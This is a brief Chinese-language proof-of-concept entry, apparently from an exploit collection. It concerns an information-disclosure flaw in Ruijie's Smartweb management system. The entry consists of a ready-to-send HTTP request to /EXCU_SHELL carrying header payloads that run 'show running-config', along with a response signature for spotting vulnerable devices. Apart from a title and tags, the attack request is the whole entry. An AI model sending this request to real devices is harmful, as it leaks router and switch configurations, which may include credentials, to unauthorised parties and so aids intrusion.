# 锐捷Smartweb管理系统EXCU_SHELL信息泄露漏洞

锐捷 ｜ 信息泄露 ｜ —
- **请求**：`GET /EXCU_SHELL HTTP/1.1`

**Payload**
```
Command1: show running-config
Confirm1: n
```
- **响应特征**：200 vlan